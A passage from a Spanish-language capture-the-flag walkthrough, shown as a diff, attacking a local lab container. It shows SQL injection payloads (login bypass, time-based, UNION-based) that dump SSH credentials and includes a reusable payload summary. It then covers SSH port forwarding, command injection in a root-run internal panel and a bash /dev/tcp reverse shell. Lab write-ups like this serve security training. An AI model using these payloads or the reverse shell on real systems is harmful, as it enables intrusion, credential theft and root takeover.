@@ -113,3 +113,213 @@ logramos inyectarla y nos logueamos llevándonos a :
 http://172.17.0.2/dashboard.php
 ```
 
+Ahora tenemos varios sitios donde poder intentar inyecciones sql, pruebo inyectando como antes en todas las consultas
+```
+'or 1=1-- -
+```
+no funiona y pruebo una inyeccion time based:
+```
+' and sleep(2)-- -
+```
+concretamente en Search Artworks logro inyectarla, puedo hacerlo desde la URL de esta forma=
+```
+http://172.17.0.2/dashboard.php?search_term=' and sleep(2)-- -
+```
+tarda dos segundos en cargar la página esto  huele a inyeccion sql,
+antes de liarnos a un time based vamos a probar un order by hasta 10 y si no resulta intentaremos el time based, pruebo:
+```bash
+172.17.0.2/dashboard.php?search_term=' ORDER BY 1-- -
+172.17.0.2/dashboard.php?search_term=' ORDER BY 2-- -
+172.17.0.2/dashboard.php?search_term=' ORDER BY 3-- -
+172.17.0.2/dashboard.php?search_term=' ORDER BY 4-- -
+172.17.0.2/dashboard.php?search_term=' ORDER BY 5-- -
+172.17.0.2/dashboard.php?search_term=' ORDER BY 6-- -
+```
+sorpresa en el ' ORDER BY 6-- - da error y nos reporta esto:
+```
+Fatal error: Uncaught mysqli_sql_exception: Unknown column '6' in 'order clause' in /var/www/html/dashboard.php:23 Stack trace: #0 /var/www/html/dashboard.php(23): mysqli_query() #1 {main} thrown in /var/www/html/dashboard.php on line 23
+```
+
+vale sabemos que al menos hemos producido un error, creo que hemos logrado reportar el numero de columnas que son 5 ya que la 6 nos reporta error.
+vamos a intentar ver si alguna columna sale reportada en la pagina web:
+
+```bash
+http://172.17.0.2/dashboard.php?search_term=' UNION SELECT 1,2,3,4,5-- -
+```
+vemos que nos aparece el numero 1,el 2 y el tres, el resto no nos van a reflejar las consultas en la web, pues vamos a intentar listar la base de datos en cualquiera de los numeros que si nos reportan informacion en la web:
+
+```bash
+http://172.17.0.2/dashboard.php?search_term=' UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata-- -
+```
+probé por orden y el "1" no me rflejaba el resultado pero el 2 parece ser que si, lsto las bases de datos y encuentro:
+```
+mysql
+information_schema
+performance_schema
+sys
+gallery_db
+secret_db
+```
+
+nos vamos a ccentrar en ese nombre tan suculento como es secret_db, ya sabemos el nombre de la base de datos que queremos mirar, ahora quiero saber sus tablas:
+```bash
+http://172.17.0.2/dashboard.php?search_term=' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema="secret_db"-- -
+```
+nombre de la tabla:
+```
+secret
+```
+
+ahora toca listar columnas:
+```bash
+http://172.17.0.2/dashboard.php?search_term=' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_schema="secret_db" AND table_name="secret"-- -
+```
+
+ahora toca mostrar los datos concatenados de las columnas encontradas que son: ssh_users y ssh_pass
+
+```bash
+http://172.17.0.2/dashboard.php?search_term=' UNION SELECT 1,CONCAT(ssh_users,0x3a,ssh_pass),3,4,5 FROM secret_db.secret-- -
+```
+
+```
+sam:$uper$ecretP4$$w0rd123
+```
+ya tenemos un user y un pass para intentar conectarnos por ssh
+
+
+## resúmen de las inyecciones:
+---
+Para saltarnos el login e ingresar directamenten a la pagina http://172.17.0.2/dashboard.php?
+```
+' or 1=1-- -
+```
+
+saber si alguna parte del panel dónde introducimos datos es vulnerable a inyecciones sql
+
+```
+' and sleep(2)-- -
+```
+
+listar columnas
+```
+' ORDER BY 1-- -
+' ORDER BY 2-- -
+...
+```
+hasta que nos dé error, entonces sabemos que la anterior al error es la correcta
+
+combinamos los resultados de la consulta, las 5 columnas y vemos si se reflejan en alguna parte de la web
+
+```
+' UNION SELECT 1,2,3,4,5-- -
+```
+vemos que en pantalla nos reporta el numero dos y tres luego en esas posiciones vamos a hacer las consultas por est orden:
+
+```
+' UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata-- -  ## schema_name en la posicion dos para listar las bases de datos
+' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema="<NOMBRE_BASE_DATOS>"-- -  ## para listar las tablas
+' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_schema="<NOMBRE_BASE_DATOS>" AND table_name="<NOMBRE_TABLA>"-- - ## listar columnas
+' UNION SELECT 1,CONCAT(<COLUMNA1>,0x3a,<COLUMNA2>),3,4,5 FROM <NOMBRE_BASE_DATOS>.<NOMBRE_TABLA>-- - ## muestre datos concatenados
+```
+---
+
+ahora probamos credenciales por ssh:
+
+```
+ssh sam@172.17.0.2
+```
+pass:
+```
+$uper$ecretP4$$w0rd123
+```
+
+
+## fase escalada de privilegios
+
+Hago una busqueda rápida de vulnerabilidades:
+```
+sam@8eddd31c6061:~$ id
+uid=1001(sam) gid=1001(sam) groups=1001(sam)
+sam@8eddd31c6061:~$ cat /etc/passwd | grep sh$
+root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+sam:x:1001:1001::/home/sam:/bin/bash
+sam@8eddd31c6061:~$ find / -perm -4000 2>/dev/null
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+sam@8eddd31c6061:~$ ps aux
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.0   2800  1876 ?        Ss   Jun13   0:00 /bin/sh -c service ssh start && service mysql start && php -S 0.0.0.0:80 -t /var/www/html &  php -S 127.0.0.1:8888 -t /var/www/terminal && tail -f /dev/null
+root           7  0.0  0.2 201244 23920 ?        S    Jun13   0:00 php -S 0.0.0.0:80 -t /var/www/html
+root           8  0.0  0.2 200988 23024 ?        S    Jun13   0:00 php -S 127.0.0.1:8888 -t /var/www/terminal
+root          17  0.0  0.0  12020  4004 ?        Ss   Jun13   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
+mysql         47  0.0  0.0   2800  1836 ?        S    Jun13   0:00 /bin/sh /usr/bin/mysqld_safe
+mysql        194  0.6  5.2 2443508 428368 ?      Sl   Jun13   0:28 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --log-error=/var/log/mysql/error.log --pid-file=8eddd31c6061.pid
+root         285  0.0  0.0  14444  7248 ?        Ss   00:45   0:00 sshd: sam [priv]
+sam          296  0.2  0.0  14704  6536 ?        S    00:45   0:00 sshd: sam@pts/0
+sam          297  0.0  0.0   5016  3964 pts/0    Ss   00:45   0:00 -bash
+sam          305  0.0  0.0   8332  4300 pts/0    R+   00:47   0:00 ps aux
+```
+Vemos que aparte de nuestro usuario el siguiente es root, ni grupos con privilegios ni SUID pero en los procesos en ejecucion vemos que root ha levantado un servicio php en los puertos 80 y 8888, pero
+el del puerto 8888 solo es visible desde el host esta abierto internamente 127.0.0.1:8888
+Realizaremos un portforwarding local con ssh de esta manera en nuestro host
+
+```
+ssh -L 8888:localhost:8888 usuario@ip_remota
+```
+  - ssh -Lqueremos conectarnos de forma local por ssh
+  - 8888:localhost:8888 queremos que nuestro puerto 8888 sea el 8888 de la victima
+  - usuario@ip_remota no necesita explicación xD
+  - 
+```
+ssh -L 8888:127.0.0.1:8888 sam@172.17.0.2
+```
+ ahora vamos al navegador y miramos que hay:
+
+ ```
+http://localhost:8888/
+```
+
+vemos un panel, en el que se pueden hacer consultas con comandos, metemos id y nos dice que no encuentra el comando que consultemos con help
+tecleamos help y nos lista los comandos, ponemos cualquiera y los reconoce, entonces vamos a probar a inyectar uno nuestro
+ponemos ; seguido de un comando por ejemplo id
+```
+help;id
+```
+```
+uid=0(root) gid=0(root) groups=0(root)
+```
+estamos inyectando comandos como root, vamos aintentar enviarnos una reverse shell, nos ponemos en escucha por el puerto 445
+```bash
+nc -nvlp 445
+```
+inyectamos en la consola:
+```bash
+help; bash -c "bash -i >& /dev/tcp/172.17.0.1/445 0>&1"
+```
+
+```
+nc -lvnp 445                                                                                                                                                                            
+listening on [any] 445 ...
+connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 39638
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@8eddd31c6061:/var/www/terminal# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@8eddd31c6061:/var/www/terminal# 
+```
+
+somos root
+
+
+
